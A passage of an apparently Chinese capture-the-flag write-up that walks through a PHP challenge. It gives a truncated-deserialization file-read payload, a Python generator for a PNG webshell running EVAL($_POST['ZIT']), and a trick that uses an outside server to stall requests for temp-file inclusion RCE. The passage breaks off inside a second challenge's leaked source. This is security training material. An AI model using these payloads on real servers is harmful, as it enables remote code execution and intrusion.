class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]))&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;ctfer&quot;</span>,serialize(<span class="string">&quot;ctfer&quot;</span>),time()+<span class="number">3600</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I see your Cookie&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/myclass/i&#x27;</span>,serialize(<span class="variable">$res</span>)))&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error: Class &#x27;myclass&#x27; not found &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;myclass.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;qwb) <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;qwb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&quot;/var/www/html/<span class="subst">$classname</span>.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çœ‹å‡ºååºåˆ—åŒ–è¯»æ–‡ä»¶ï¼Œå…³é”®åœ¨äºåé¢ <code>myclass</code> çš„æ­£åˆ™è¿‡æ»¤ã€‚æ­¤æ—¶åªæœ‰è®© <code>$res</code> ä¸å­˜åœ¨ï¼Œå†æ¬¡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é‡Œæ‰èƒ½æ²¡æœ‰è¿™ä¸ªç±»ã€‚åœ¨ PHP çš„æ‰‹å†Œä¸­æœ‰å¦‚ä¸‹æè¿°ã€‚</p><blockquote><p>å¦‚æœä¼ é€’çš„å­—ç¬¦ä¸²ä¸å¯ååºåˆ—åŒ–ï¼Œåˆ™è¿”å› **<code>false</code>**ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª **<code>E_NOTICE</code>**ã€‚</p></blockquote><p>å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦è®©ååºåˆ—åŒ–è¿›è¡Œåˆ°ä¸€åŠå°±å¤±è´¥å³å¯ã€‚å°è¯•ä¿®æ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æœ€åå‡ ä¸ªå­—ç¬¦å³å¯è¾¾æˆç›®çš„ã€‚ä½¿ç”¨å¦‚ä¸‹è„šæœ¬æ„é€ è¯»å–æ–‡ä»¶çš„è½½è·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger the include of myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$triggerHello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;triggerHello = <span class="keyword">new</span> Hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwb</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;qwb = <span class="string">&quot;e2a7106f1cc8bb1e1318df70aa0a3540.php&quot;</span>; <span class="comment">// read file</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> substr(urlencode(serialize(<span class="keyword">new</span> myclass())), <span class="number">0</span>, -<span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>è„šæœ¬å°†ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æœ€åä¸¤ä¸ª <code>&#125;</code> ï¼Œæ­¤æ—¶åºåˆ—åŒ–ä¼šæˆåŠŸè¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯æœ€ç»ˆä¼šå¤±è´¥ï¼Œä»è€Œç»•è¿‡äº†åé¢çš„æ­£åˆ™ã€‚è¯»å–åˆ°äº†å¦‚ä¸‹æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;bff139fa05ac583f685a523ab3d110a0.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;45b963397aa40d4a0063e0d85e4fe7a1.php&quot;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;119ef9cf-b19b-4bff-90ea-c6bb9b30b2ce&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;119ef9cf-b19b-4bff-90ea-c6bb9b30b2ce&#x27;</span>]:<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = preg_match(<span class="string">&quot;/tmp/i&quot;</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>)&#123;</span><br><span class="line">    PNG(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$res</span> = @scandir(<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>]===<span class="string">&#x27;/tmp&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$somthing</span> = GenFiles();</span><br><span class="line">    <span class="variable">$res</span> = array_merge(<span class="variable">$res</span>,<span class="variable">$somthing</span>);</span><br><span class="line">&#125;</span><br><span class="line">shuffle(<span class="variable">$res</span>);</span><br><span class="line">@print_r(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç°å…¶æœ‰åˆ—å‡ºç›®å½•çš„åŠŸèƒ½ã€‚é™¤æ­¤ä¹‹å¤–å¯ä»¥ä»¥åŒæ ·çš„æ–¹å¼å°†å…¶ä¸­ include çš„æ–‡ä»¶è¯»å‡ºã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bff139fa05ac583f685a523ab3d110a0.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PNG</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_file(<span class="variable">$file</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;æˆ‘ä»æ¥æ²¡æœ‰è§è¿‡ä¾¬&quot;</span>);&#125;</span><br><span class="line">    <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$first</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å‘ç°äº†å¥‡æ€ªçš„ä¸œè¥¿2333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">    unlink(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        imagepng(<span class="variable">$second</span>, <span class="variable">$file</span>);</span><br><span class="line">        imagedestroy(<span class="variable">$second</span>);<span class="comment">//é”€æ¯ï¼Œæ¸…å†…å­˜</span></span><br><span class="line">    &#125;</span><br><span class="line">    imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//45b963397aa40d4a0063e0d85e4fe7a1.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GenFiles</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$len</span>=strlen(<span class="variable">$str</span>)-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&quot;php&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">6</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$filename</span>  .= <span class="variable">$str</span>[rand(<span class="number">0</span>,<span class="variable">$len</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// file_put_contents(&#x27;/tmp/&#x27;.$filename,&#x27;flag&#123;fake_flag&#125;&#x27;);</span></span><br><span class="line">        <span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$files</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…¶ä¸­ <code>PNG</code> å‡½æ•°å¯¹ä¼ å…¥çš„æ–‡ä»¶è¿›è¡Œäº†é‡æ¸²æŸ“æ“ä½œã€‚<code>/tmp</code> ä¸‹çš„æ–‡ä»¶å°†è¢«ä¼ ç»™ <code>PNG</code> é‡æ¸²æŸ“åç›´æ¥åŒ…å«ã€‚<code>GenFiles</code> åˆ™æ˜¯ç”Ÿæˆå‡çš„æ–‡ä»¶å­—ç¬¦ä¸²æ¥æ··æ·†è§†å¬ï¼Œç”±äºæ˜¯å¼ºç­‰äºçš„åˆ¤æ–­ <code>===&#39;/tmp&#39;</code>ï¼Œç›´æ¥ç”¨ <code>/tmp/</code> å³å¯ç»•è¿‡è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œã€‚è€ŒäºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡é©¬å¯ä»¥å€Ÿç”± <code>PNG-IDAT-Payload-Generator</code> å†™å‡ºå¦‚ä¸‹è„šæœ¬æ¥ç”Ÿæˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD_LENGTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># PAYLOAD = &quot;(\&quot;PHP\&quot;.\&quot;INFO\&quot;)()&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;EVAL($_POST[\&quot;ZIT\&quot;])&quot;</span></span><br><span class="line">DEFAULT_COMPRESSED_STRING = <span class="string">b&quot;\xa3\x9f\x67\x54\x6f\x2c\x24\x15\x2b\x11\x67\x12\x54\x6f\x11\x2e\x29\x15\x2b\x21\x67\x22\x6b\x6f\x5f\x53\x10&quot;</span></span><br><span class="line">ENV = <span class="string">&quot;http://QUESTION_HOST_HERE/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawDeflate</span>(<span class="params">data, compresslevel=<span class="number">9</span></span>):</span></span><br><span class="line">    compress = zlib.compressobj(</span><br><span class="line">        compresslevel,  <span class="comment"># level: 0-9</span></span><br><span class="line">        zlib.DEFLATED,  <span class="comment"># method: must be DEFLATED</span></span><br><span class="line">        -zlib.MAX_WBITS,  <span class="comment"># window size in bits:</span></span><br><span class="line">        <span class="comment">#   -15..-8: negate, suppress header</span></span><br><span class="line">        <span class="comment">#   8..15: normal</span></span><br><span class="line">        <span class="comment">#   16..30: subtract 16, gzip header</span></span><br><span class="line">        zlib.DEF_MEM_LEVEL,  <span class="comment"># mem level: 1..8/9</span></span><br><span class="line">        <span class="number">0</span>  <span class="comment"># strategy:</span></span><br><span class="line">        <span class="comment">#   0 = Z_DEFAULT_STRATEGY</span></span><br><span class="line">        <span class="comment">#   1 = Z_FILTERED</span></span><br><span class="line">        <span class="comment">#   2 = Z_HUFFMAN_ONLY</span></span><br><span class="line">        <span class="comment">#   3 = Z_RLE</span></span><br><span class="line">        <span class="comment">#   4 = Z_FIXED</span></span><br><span class="line">    )</span><br><span class="line">    deflated = compress.compress(data)</span><br><span class="line">    deflated += compress.flush()</span><br><span class="line">    <span class="keyword">return</span> deflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawInflate</span>(<span class="params">data</span>):</span></span><br><span class="line">    decompress = zlib.decompressobj(-zlib.MAX_WBITS)</span><br><span class="line">    inflated = decompress.decompress(data)</span><br><span class="line">    inflated += decompress.flush()</span><br><span class="line">    <span class="keyword">return</span> inflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate payload</span></span><br><span class="line">payload = (PAYLOAD + <span class="string">&quot;&#123;&#125;&quot;</span>).<span class="built_in">format</span>(<span class="string">&quot; &quot;</span> * <span class="built_in">int</span>(PAYLOAD_LENGTH - (<span class="built_in">len</span>(PAYLOAD)))).encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Using payload ~&#123;&#125;~&quot;</span>.<span class="built_in">format</span>(payload))</span><br><span class="line">payloadWrapped = codecs.encode(</span><br><span class="line">    RawInflate(RawDeflate(DEFAULT_COMPRESSED_STRING).replace(<span class="string">b&quot;$_GET[0]($_POST[1]);&quot;</span>, payload)), <span class="string">&quot;hex_codec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated wrapped payload &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payloadWrapped))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate image</span></span><br><span class="line">evilImage = <span class="string">&quot;./evilImage.png&quot;</span></span><br><span class="line">filterProof = bypass_filters(payloadWrapped)</span><br><span class="line">save_image(filterProof, evilImage)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated Image &#123;&#125;&quot;</span>.<span class="built_in">format</span>(evilImage))</span><br><span class="line">verify(evilImage, payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Fin&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ•´ä¸ªåŒ…å«ä¸´æ—¶æ–‡ä»¶ RCE çš„è·¯å¾„å°±å®Œæ•´äº†ï¼Œä½†æ˜¯ä¸´æ—¶æ–‡ä»¶è¦æƒ³åŠæ³•ç•™å­˜æ›´ä¹…ã€‚å› æ­¤è€ƒè™‘ä½¿ç”¨ <code>file_get_contents($this-&gt;qwb);</code> æ¥é˜»å¡è¿›ç¨‹ï¼Œå³åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç»™å‡ºå¦‚ä¸‹ä»£ç ï¼Œä½¿å¾—ç¨‹åºçš„è¯·æ±‚å¼ºåˆ¶åœç•™ç­‰å¾…ï¼Œå³ç»™ä¸´æ—¶æ–‡ä»¶åŒ…å«æä¾›äº†æ—¶é—´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    sleep(<span class="number">2147483647</span>);</span><br></pre></td></tr></table></figure><p>å†™å‡ºå¦‚ä¸‹è½½è·æ¥è¾¾æˆé˜»å¡çš„ç›®çš„ï¼ŒåŒæ—¶ä»¥ POST çš„æ–¹å¼å°†ç”Ÿæˆçš„æ¶æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger the include of myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$triggerHello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;triggerHello = <span class="keyword">new</span> Hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwb</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;qwb = <span class="string">&quot;http://8.136.8.210:3255&quot;</span>; <span class="comment">// force sleep 2147483647</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> substr(urlencode(serialize(<span class="keyword">new</span> myclass())), <span class="number">0</span>, -<span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶åä½¿ç”¨ <code>e2a7106f1cc8bb1e1318df70aa0a3540.php</code> åˆ—å‡º <code>/tmp</code> ä¸‹çš„æ–‡ä»¶ï¼Œå†å‘é€è¯·æ±‚å°†å…¶åŒ…å«åæ‰§è¡ŒæŒ‡ä»¤ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623633738014/988c7ff307e04bdbc84a0cb0bd53610d521b78ab.png" alt="image-20210614092215747"></p><p>åœ¨ <code>/l1b</code> ä¸‹å¯ä»¥æ‰¾åˆ°ç–‘ä¼¼ flag çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•è¯»å‡ºï¼ŒçŒœæµ‹éœ€è¦ä¸€ä¸ª readflagï¼Œå¯ä»¥æ‰¾åˆ°æœ‰ <code>/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG</code> æ–‡ä»¶ï¼Œå°†å…¶ä½œ readflag ä½¿ç”¨ï¼Œæ„é€  <code>/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/06cb199b/1ea50a20/8d8880fa/eaf8f8a5/c7769282/Fl444gggb08c9817</code> å³å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e9f76b6f-46c5-477e-b7ec-f5f03df1f74a&#125;</span><br></pre></td></tr></table></figure><h3 id="å¼ºç½‘å…ˆé”‹-èµŒå¾’"><a href="#å¼ºç½‘å…ˆé”‹-èµŒå¾’" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]èµŒå¾’"></a>[å¼ºç½‘å…ˆé”‹]èµŒå¾’</h3><p><a href="http://www.zip/">www.zip</a> æœ‰æºç æ³„éœ²ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 